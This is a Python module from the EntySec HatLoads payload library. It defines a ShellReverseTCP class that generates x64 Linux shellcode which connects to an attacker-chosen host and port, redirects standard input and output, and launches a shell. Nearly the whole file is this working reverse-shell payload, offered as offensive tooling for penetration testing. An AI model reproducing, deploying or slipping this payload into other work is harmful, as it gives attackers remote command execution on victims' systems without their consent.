#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatasm import HatAsm
from hatvenom import HatVenom

from hatloads.consts import Consts


class ShellReverseTCP(HatAsm, HatVenom, Consts):
    def generate(self, assemble=True, options={}):
        if 'RHOST' not in options and 'RPORT' not in options:
            return b''

        rhost = self.convert_host(options['RHOST'])
        rport = self.convert_port(options['RPORT'])

        shellcode = f"""
        start:
            push 0x29
            pop rax
            cdq
            push 0x2
            pop rdi
            push 0x1
            pop rsi
            syscall

            xchg rdi, rax
            movabs rcx, 0x{rhost.hex()}{rport.hex()}0002
            push rcx
            mov rsi, rsp
            push 0x10
            pop rdx
            push 0x2a
            pop rax
            syscall

            push 0x3
            pop rsi

        dup:
            dec rsi
            push 0x21
            pop rax
            syscall

            jne dup
            push 0x3b
            pop rax
            cdq
            movabs rbx, 0x{(self.shell + b'\x00').hex()}
            push rbx
            mov rdi, rsp
            push rdx
            push rdi
            mov rsi, rsp
            syscall
        """

        if assemble:
            return self.assemble('x64', shellcode)
        return shellcode
